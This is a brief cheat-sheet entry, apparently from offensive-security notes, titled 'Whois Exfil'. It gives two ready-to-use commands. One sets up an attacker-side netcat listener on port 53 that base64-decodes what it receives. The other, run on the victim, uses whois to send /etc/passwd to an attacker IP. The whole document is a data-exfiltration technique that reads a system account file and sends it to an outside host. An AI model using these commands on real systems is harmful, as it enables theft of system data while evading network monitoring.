# Whois Exfil

From attacker: 

```
nc -nvlp 53 | sed "s/ //g" | base64 -d
```

From victim:

```
whois -h <Attacker IP> -p 53 cat /etc/passwd | base64
```